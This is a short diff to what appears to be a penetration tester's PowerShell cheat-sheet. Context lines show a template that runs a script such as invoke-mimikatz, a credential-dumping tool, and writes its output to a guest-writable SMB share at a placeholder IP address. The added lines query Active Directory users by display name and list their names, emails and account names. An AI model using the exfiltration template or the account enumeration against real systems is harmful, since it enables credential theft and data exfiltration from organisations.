@@ -33,3 +33,8 @@ Powershell output to SMB share:
 #script content here
 $A = function_name_for_above_script_here #example: invoke-mimikatz
 Out-File -FilePath \\IP_ADDR_HERE\guest_writable_smb_share_name_here\output_filename_here.txt -InputObject $A -Encoding ASCII
+
+Powershell Get-ADUser Input File and List:
+$users = Get-Content "C:\temp\user_list.txt"
+$users = "Fname1 Lname1","Fname2 Lname2","Fname3 Lname3"
+$out = Foreach ($user in $users) { Get-ADuser -Filter { displayname -eq $user } -Properties * | select name,mail,samaccountname }; $out | out-gridview
